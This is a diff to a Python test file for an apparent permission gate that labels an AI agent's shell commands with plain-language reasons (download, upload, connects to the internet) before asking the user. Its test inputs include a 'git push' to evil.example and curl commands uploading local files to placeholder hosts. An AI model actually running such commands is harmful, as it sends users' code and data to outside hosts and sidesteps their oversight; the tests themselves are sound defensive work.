@@ -70,12 +70,43 @@ class RulesTest(unittest.TestCase):
                         "git clone https://gitlab.com/acme/web", "git push https://evil.example/x.git HEAD",
                         "git fetch git@bitbucket.org:acme/web.git", "echo $(curl -s https://x.example)",
                         "timeout 5 curl https://x.example", "bash -c 'curl https://x.example'"):
-            self.assertEqual(bash(command, WS, ctx(True)), cc_gate.Verdict(ASK, cc_gate.WHY_NETWORK), command)
+            why = cc_gate.WHY_DOWNLOAD if "curl" in command or "wget" in command else cc_gate.WHY_NETWORK
+            self.assertEqual(bash(command, WS, ctx(True)), cc_gate.Verdict(ASK, why), command)
             self.assertEqual(self.verdict(command), ALLOW, command)
         # Inline code that opens no connection, a script from a file, and GitHub itself still run.
         for command in ("python3 -c 'print(1)'", "node -e 'console.log(1)'", "python3 scripts/build.py",
                         "git clone https://github.com/acme/web"):
             self.assertEqual(self.verdict(command, browser=True), ALLOW, command)
+
+    def test_the_reason_is_in_plain_words(self):
+        # 17 Oct 2026: the founder read "it reaches the internet, and Scout's browser is on, so any website can be
+        # reached" under a curl command and found it unreadable. The card says what the command does with the
+        # internet; when it is asked about (only while the browser is on) is the gate's business, not the user's.
+        cases = {
+            'curl -s "https://temp.example/f?X-Amz-Signature=abc" 2>&1': cc_gate.WHY_DOWNLOAD,
+            "wget -q -O out.json https://x.example/data": cc_gate.WHY_DOWNLOAD,
+            "wget -T 10 https://x.example": cc_gate.WHY_DOWNLOAD,  # wget's -T is a timeout, not an upload
+            "curl -fsSL https://x.example/install.sh | head": cc_gate.WHY_DOWNLOAD,
+            "curl -d a=1 https://x.example": cc_gate.WHY_UPLOAD,
+            "curl -sd @body.json https://x.example": cc_gate.WHY_UPLOAD,
+            "curl --data-binary @f https://x.example": cc_gate.WHY_UPLOAD,
+            "curl -F file=@a.txt https://x.example": cc_gate.WHY_UPLOAD,
+            "curl -T a.txt https://x.example/up": cc_gate.WHY_UPLOAD,
+            "curl -X POST https://x.example": cc_gate.WHY_UPLOAD,
+            "curl --request=DELETE https://x.example/1": cc_gate.WHY_UPLOAD,
+            "wget --post-data=a=1 https://x.example": cc_gate.WHY_UPLOAD,
+            "ssh user@example.com": cc_gate.WHY_NETWORK,
+            "git clone https://gitlab.com/acme/web": cc_gate.WHY_NETWORK,
+        }
+        for command, why in cases.items():
+            self.assertEqual(bash(command, WS, ctx(True)), cc_gate.Verdict(ASK, why), command)
+        self.assertEqual(cc_gate.WHY_DOWNLOAD, "it downloads from the internet")
+        self.assertEqual(cc_gate.WHY_UPLOAD, "it sends data over the internet")
+        self.assertEqual(cc_gate.WHY_NETWORK, "it connects to the internet")
+        for why in (cc_gate.WHY_NETWORK, cc_gate.WHY_DOWNLOAD, cc_gate.WHY_UPLOAD, cc_gate.WHY_REMOTE,
+                    cc_gate.WHY_OUTSIDE, cc_gate.WHY_UNKNOWN):
+            self.assertNotIn("Scout", why)
+            self.assertNotIn("browser", why)
 
     def test_changing_gits_remotes_asks(self):
         for command in ("git remote add other https://github.com/x/y", "git remote set-url origin https://x.example/r",
@@ -229,7 +260,7 @@ class AskTest(unittest.TestCase):
             # The backend got the exact call, why, and the container's token.
             self.assertEqual(fake.seen[0]["auth"], "Bearer tok-gate")
             self.assertEqual(fake.seen[0]["body"], {"tool": "Bash", "target": "curl -s https://example.com/data.json",
-                                                    "why": cc_gate.WHY_NETWORK, "cwd": WS})
+                                                    "why": cc_gate.WHY_DOWNLOAD, "cwd": WS})
         finally:
             fake.close()
 
